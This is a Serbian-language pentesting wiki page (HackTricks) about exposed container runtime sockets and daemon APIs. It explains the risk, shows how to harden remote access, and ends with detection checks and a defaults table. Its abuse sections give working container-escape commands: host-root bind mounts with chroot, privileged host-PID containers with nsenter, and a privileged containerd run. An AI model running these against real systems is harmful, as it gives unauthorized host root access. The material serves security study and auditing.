# Runtime API i izloženost daemona

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Mnogi stvarni kompromisi container-a uopšte ne počinju namespace escape-om. Počinju pristupom runtime control plane-u. Ako workload može da komunicira sa `dockerd`, `containerd`, CRI-O, Podman, ili kubelet preko mountovanog Unix socketa ili izloženog TCP listener-a, napadač može da zatraži novi container sa većim privilegijama, mount-uje host filesystem, priključi se host namespaces ili dohvati osetljive informacije o nodu. U tim slučajevima runtime API je prava granica sigurnosti, i kompromitovanje iste je funkcionalno blisko kompromitovanju host-a.

Zbog toga izloženost runtime socketa treba dokumentovati odvojeno od kernel protections. Container sa uobičajenim seccomp, capabilities i MAC confinement može i dalje biti udaljen samo jedan API poziv od kompromitovanja host-a ako je `/var/run/docker.sock` ili `/run/containerd/containerd.sock` mountovan unutar njega. Kernel izolacija trenutnog containera može raditi tačno kako je dizajnirano, dok runtime management plane ostaje potpuno izložen.

## Modeli pristupa daemona

Docker Engine tradicionalno izlaže svoj privilegovani API preko lokalnog Unix socketa na `unix:///var/run/docker.sock`. Istorijski je takođe bio izložen i remotelno preko TCP listener-a kao što su `tcp://0.0.0.0:2375` ili TLS-zaštićenog listener-a na `2376`. Izlaganje daemona remotelno bez jakog TLS-a i klijentske autentifikacije efektivno pretvara Docker API u remote root interfejs.

`containerd`, CRI-O, Podman i kubelet izlažu slične površine visokog uticaja. Imena i workflows se razlikuju, ali logika ostaje ista. Ako interfejs omogućava pozivaocu da kreira workloads, mount-uje host puteve, dobije credentials ili menja pokrenute containere, interfejs je privilegovani management kanal i treba ga tretirati u skladu s tim.

Uobičajeni lokalni putevi koje vredi proveriti su:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stariji ili specijalizovaniji sistemi mogu takođe izložiti krajnje tačke poput `dockershim.sock`, `frakti.sock` ili `rktlet.sock`. One su ređe u savremenim okruženjima, ali kada se pojave treba ih tretirati sa istom opreznošću jer predstavljaju površine za kontrolu runtime-a, a ne obične aplikacione sokete.

## Siguran daljinski pristup

Ako daemon mora biti izložen izvan lokalnog soketa, konekcija bi trebalo da bude zaštićena TLS-om i po mogućstvu uz međusobnu autentifikaciju, tako da daemon verifikuje klijenta, a klijent verifikuje daemon. Stari običaj da se Docker daemon otvara preko običnog HTTP-a radi pogodnosti je jedna od najopasnijih grešaka u administraciji kontejnera, jer je API površina dovoljno moćna da direktno kreira privilegovane kontejnere.

Istorijski obrazac konfiguracije Dockera je izgledao ovako:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Na systemd-based hostovima, daemon komunikacija može se takođe pojaviti kao `fd://`, što znači da proces nasleđuje unapred otvoren socket od systemd umesto da ga sam direktno veže. Bitna lekcija nije tačan sintaksis, već sigurnosna posledica. U trenutku kada daemon sluša dalje od strogo permissioned lokalnog socketa, transport security i client authentication postaju obavezne umesto opcionalnog hardeninga.

## Zloupotreba

Ako runtime socket postoji, potvrdite koji je u pitanju, da li postoji kompatibilan client, i da li je moguć raw HTTP ili gRPC pristup:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Ove komande su korisne zato što prave razliku između dead path-a, montiranog ali nedostupnog socket-a i live privileged API-ja. Ako klijent uspe, sledeće pitanje je da li API može da pokrene novi container sa host bind mount-om ili deljenjem host namespace-a.

### Kompletan primer: Docker Socket To Host Root

Ako `docker.sock` može da se dosegne, klasični escape je da se pokrene novi container koji montira host root filesystem i zatim `chroot`-uje u njega:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Ovo obezbeđuje direktno host-root izvršavanje preko Docker daemon-a. Uticaj nije ograničen samo na čitanje fajlova. Jednom unutar novog container-a, napadač može menjati host fajlove, prikupljati kredencijale, implantirati persistence ili pokrenuti dodatne privilegovane workloads.

### Full Example: Docker Socket To Host Namespaces

Ako napadač preferira ulazak u namespace umesto pristupa samo filesystem-u:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Ovaj put dostiže host tako što se od runtime-a traži da kreira novi container sa eksplicitnim izlaganjem host-namespace umesto iskorišćavanja trenutnog.

### Potpun primer: containerd Socket

Montiran `containerd` socket je obično podjednako opasan:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Uticaj je ponovo kompromitacija hosta. Čak i ako Docker-specific tooling nije prisutan, neki drugi runtime API može i dalje ponuditi istu administrativnu moć.

## Provere

Cilj ovih provera je da odgovore na pitanje da li kontejner može da dosegne bilo koju upravljačku ravninu koja je trebalo da ostane izvan granica poverenja.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Šta je ovde zanimljivo:

- Montirani runtime socket obično predstavlja direktan administrativni primitiv, a ne puko otkrivanje informacija.
- TCP listener na `2375` bez TLS treba tretirati kao uslov za udaljenu kompromitaciju.
- Promenljive okruženja poput `DOCKER_HOST` često otkrivaju da je workload namerno dizajniran da komunicira sa host runtime-om.

## Podrazumevana podešavanja runtime-a

| Runtime / platform | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevani lokalni Unix socket | `dockerd` osluškuje lokalni socket i daemon je obično pokrenut kao root | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | Podrazumevano CLI bez daemona | Za uobičajenu lokalnu upotrebu nije potreban dugotrajni privilegovani daemon; API socket-i mogu biti izloženi kada je omogućen `podman system service` | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Lokalni privilegovani socket | Administrativni API izložen preko lokalnog socketa i obično korišćen od strane alata višeg nivoa | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Lokalni privilegovani socket | CRI endpoint je namenjen za lokalne, pouzdane komponente na čvoru | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | API za upravljanje lokalno na čvoru | Kubelet ne bi trebalo da bude široko dostupan iz Pods; pristup može otkriti stanje pod-a, kredencijale i mogućnosti izvršavanja u zavisnosti od authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |
{{#include ../../../banners/hacktricks-training.md}}
